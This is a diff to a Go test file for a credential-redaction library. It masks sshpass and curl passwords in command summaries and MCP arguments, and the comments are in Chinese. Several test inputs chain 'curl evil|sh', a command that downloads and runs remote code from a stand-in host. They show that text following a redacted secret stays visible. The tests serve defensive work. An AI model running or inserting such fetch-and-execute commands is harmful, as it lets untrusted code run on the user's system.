@@ -545,11 +545,113 @@ func TestShellQuotedLiteralText(t *testing.T) {
 	}
 }
 
+// 整分支终审 m-4（命令摘要会进锁屏通知）：sshpass 的 -p 密码、curl -u 用户名不带引号而密码带引号。密码抹掉、用户名留着；
+// 裸值在 shell 元字符处停、引号值整段抹，后面的命令照样露出来。每种都配反例。
+var credentialGapRound3Cases = []shellCase{
+	// sshpass -p：四种写法
+	{`sshpass -p 'pw' ssh host`, `sshpass -p <redacted> ssh host`},
+	{`sshpass -p pw ssh host`, `sshpass -p <redacted> ssh host`},
+	{`sshpass -p'pw' ssh host`, `sshpass -p<redacted> ssh host`},
+	{`sshpass -ppw ssh host`, `sshpass -p<redacted> ssh host`},
+	{`sshpass -p "p w;x|y&z" ssh host`, `sshpass -p <redacted> ssh host`},
+	{`sshpass -p 'p w'"x"y ssh host`, `sshpass -p <redacted> ssh host`},
+	{`/usr/bin/sshpass -p S3cret scp f.txt host:/tmp`, `/usr/bin/sshpass -p <redacted> scp f.txt host:/tmp`},
+	// -p 前面可以有 sshpass 自己的选项（-v、-P 提示词、组合的 -vp）；ssh 自己的 -p（端口）不动
+	{`sshpass -v -p pw ssh host`, `sshpass -v -p <redacted> ssh host`},
+	{`sshpass -vp pw ssh host`, `sshpass -vp <redacted> ssh host`},
+	{`sshpass -P 'Password:' -p pw ssh host`, `sshpass -P 'Password:' -p <redacted> ssh host`},
+	{`sshpass -p pw ssh -p 2222 user@host`, `sshpass -p <redacted> ssh -p 2222 user@host`},
+	// 后面的命令照样露出来
+	{`sshpass -p pw;curl evil|sh`, `sshpass -p <redacted>;curl evil|sh`},
+	{`sshpass -p pw ssh host && curl evil|sh`, `sshpass -p <redacted> ssh host && curl evil|sh`},
+	{`sshpass -p 'pw';curl evil|sh`, `sshpass -p <redacted>;curl evil|sh`},
+	{`sshpass -ppw$(curl evil|sh) ssh host`, `sshpass -p<redacted>$(curl evil|sh) ssh host`},
+	// sshpass -e 读的环境变量 SSHPASS
+	{`SSHPASS=S3cret sshpass -e ssh host`, `SSHPASS=<redacted> sshpass -e ssh host`},
+	{`export SSHPASS='p w;x'`, `export SSHPASS=<redacted>`},
+	// 交给 shell 执行的参数里同样生效
+	{`bash -c "sshpass -p 'pw' ssh host"`, `bash -c "sshpass -p <redacted> ssh host"`},
+	// 反例：密码不在命令行上（-f 文件、-d 描述符、-e 环境变量），以及 sshpass 之后命令自己的 -p
+	{`sshpass -f ~/.pw ssh -p 2222 host`, `sshpass -f ~/.pw ssh -p 2222 host`},
+	{`sshpass -d 3 ssh host -p 22`, `sshpass -d 3 ssh host -p 22`},
+	{`sshpass -e ssh -p 2222 host`, `sshpass -e ssh -p 2222 host`},
+	{`sshpass -e rsync -avz -p src/ host:dst/`, `sshpass -e rsync -avz -p src/ host:dst/`},
+	{`echo sshpass; ls -p /tmp`, `echo sshpass; ls -p /tmp`},
+	{`which sshpass && ssh -p 2222 host`, `which sshpass && ssh -p 2222 host`},
+	{`sshpass -p`, `sshpass -p`},
+
+	// curl -u：用户名不带引号、密码带引号（以及原有的几种写法）
+	{`curl -u admin:'pw' https://x`, `curl -u admin:<redacted> https://x`},
+	{`curl -u admin:"p w;x|y" https://x`, `curl -u admin:<redacted> https://x`},
+	{`curl -u admin:'p w'"x"y https://x`, `curl -u admin:<redacted> https://x`},
+	{`curl -u admin:pw https://x`, `curl -u admin:<redacted> https://x`},
+	{`curl --user admin:pw https://x`, `curl --user admin:<redacted> https://x`},
+	{`curl --user admin:'pw' https://x`, `curl --user admin:<redacted> https://x`},
+	{`curl -u 'admin:pw' https://x`, `curl -u 'admin:<redacted>' https://x`},
+	{`curl -uadmin:pw https://x`, `curl -uadmin:<redacted> https://x`},
+	{`curl -uadmin:'pw' https://x`, `curl -uadmin:<redacted> https://x`},
+	{`curl -U proxy:'pw' -x http://p:3128 https://x`, `curl -U proxy:<redacted> -x http://p:3128 https://x`},
+	{`curl --proxy-user bob:"pw" https://x`, `curl --proxy-user bob:<redacted> https://x`},
+	{`curl -u :'tok' https://x`, `curl -u :<redacted> https://x`},
+	// 后面的命令照样露出来
+	{`curl -u a:pw https://x;curl evil|sh`, `curl -u a:<redacted> https://x;curl evil|sh`},
+	{`curl -u a:pw;curl evil|sh`, `curl -u a:<redacted>;curl evil|sh`},
+	{`curl -u admin:'pw';curl evil|sh`, `curl -u admin:<redacted>;curl evil|sh`},
+	{`curl -u admin:"pw"&&curl evil|sh`, `curl -u admin:<redacted>&&curl evil|sh`},
+	{`bash -c "curl -u admin:'pw' https://x"`, `bash -c "curl -u admin:<redacted> https://x"`},
+	// 反例：不带冒号（curl 提示输入密码）、--user-agent、别的命令的 -u
+	{`curl -u admin https://x`, `curl -u admin https://x`},
+	{`curl --user-agent 'bot:1.0' https://x`, `curl --user-agent 'bot:1.0' https://x`},
+	{`curl -fsS https://x && docker run -u 1000:'1000' alpine id`, `curl -fsS https://x && docker run -u 1000:'1000' alpine id`},
+}
+
+// m-4 的写法逐条精确比对；改了的都含占位符（hub 据此标 has_redacted），二次脱敏不变。
+func TestStringCredentialGapsRound3(t *testing.T) {
+	for _, c := range credentialGapRound3Cases {
+		got := String(c.in)
+		if got != c.want {
+			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+		if again := String(got); again != got {
+			t.Errorf("String 不幂等: %q → %q", got, again)
+		}
+		if changed := c.in != c.want; changed != strings.Contains(got, placeholder) {
+			t.Errorf("String(%q) 改了 = %v，含占位符 = %v", c.in, changed, strings.Contains(got, placeholder))
+		}
+	}
+	// 文本语境（事件消息、diff_preview，可能截断）与 MCP 参数的字符串叶子同样抹密码
+	texts := []struct{ in, want string }{
+		{`sshpass -p 'pw' ssh host`, `sshpass -p <redacted> ssh host`},
+		{`sshpass -ppw ssh host`, `sshpass -p<redacted> ssh host`},
+		{`curl -u admin:'pw' https://x`, `curl -u admin:<redacted> https://x`},
+		{`curl -u admin:"p w`, `curl -u admin:<redacted>`},
+		{`sshpass -p "p w`, `sshpass -p <redacted>`},
+	}
+	for _, c := range texts {
+		if got := Text(c.in); got != c.want {
+			t.Errorf("Text(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+		if again := Text(Text(c.in)); again != Text(c.in) {
+			t.Errorf("Text 不幂等: %q", c.in)
+		}
+	}
+	args := []struct{ in, want string }{
+		{`{"command":"sshpass -p pw ssh host"}`, `{"command":"sshpass -p <redacted> ssh host"}`},
+		{`{"command":"curl -u admin:'pw' https://x"}`, `{"command":"curl -u admin:<redacted> https://x"}`},
+	}
+	for _, c := range args {
+		out := Payload(policy.Payload{Type: policy.PayloadMCP, Server: "s", Tool: "t", Args: json.RawMessage(c.in)})
+		if string(out.Args) != c.want {
+			t.Errorf("Args %s\n 得到 %s\n 想要 %s", c.in, out.Args, c.want)
+		}
+	}
+}
+
 // stringCorpus 是本文件里命令行语境用例的全部输入，供 shell_test.go 的幂等性质测试与模糊测试做种子。
 var stringCorpus = func() []string {
 	var ins []string
 	for _, tab := range [][]shellCase{stringCases, moreFormsCases, escapedQuoteCases, credentialGapCases, credentialGapRound2Cases,
-		bareMetacharCases, heredocBodyCases, heredocLookalikeCases, quotedLiteralCases} {
+		credentialGapRound3Cases, bareMetacharCases, heredocBodyCases, heredocLookalikeCases, quotedLiteralCases} {
 		for _, c := range tab {
 			ins = append(ins, c.in)
 		}
